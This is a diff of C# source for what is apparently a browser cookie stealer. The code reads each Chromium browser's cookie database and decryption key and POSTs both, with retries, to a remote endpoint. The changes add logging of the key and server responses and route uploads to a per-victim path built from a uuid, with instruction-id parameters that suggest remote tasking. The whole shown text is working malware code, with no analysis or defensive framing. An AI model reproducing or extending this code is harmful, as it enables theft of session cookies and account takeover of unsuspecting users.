@@ -65,7 +65,12 @@ public class Script
         }
 	public static async Task SendCookiesDBWithRetry(string endpointUrl, string browser, byte[] secretKey, string dataPath, int maxRetries)
 	{
-		TimeSpan delay = TimeSpan.FromSeconds(10);
+        Console.WriteLine("Endpoint: " + endpointUrl +
+                         ", Browser: " + browser +
+                         ", Secret Key: " + BitConverter.ToString(secretKey) +
+                         ", Data Path: " + dataPath +
+                         ", Max Retries: " + maxRetries);
+        TimeSpan delay = TimeSpan.FromSeconds(10);
 		int retryCount = 0;
 		while (retryCount < maxRetries)
 		{
@@ -84,7 +89,8 @@ public class Script
 					var content = new StringContent(contectData, Encoding.UTF8, "application/json");
 					client.Timeout = TimeSpan.FromMinutes(10);
 					HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
-					if (response.IsSuccessStatusCode)
+					Console.WriteLine("Response Status Code: " + (int)response.StatusCode + " - " + response.StatusCode);
+                    if (response.IsSuccessStatusCode)
 					{
 						break;
 					}
@@ -108,7 +114,7 @@ public class Script
 		}
 	}
 	
-    public static async Task<string> ExecuteAsync(string endpoint)
+    public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instructionId, short code)
     {
         foreach (string browser in chromiumBrowsers)
             {
@@ -133,7 +139,7 @@ public class Script
                 if (readSecretKey != null && File.Exists(DataPath))
                 {
                     // Send The File And The Secret Key to an EndPoint
-                    await SendCookiesDBWithRetry(endpoint, browser, readSecretKey, DataPath, 10);
+                    await SendCookiesDBWithRetry(endpoint+ "Response/Browser/Cookies/" + uuid, browser, readSecretKey, DataPath, 10);
                 }
             }
             return "Done";
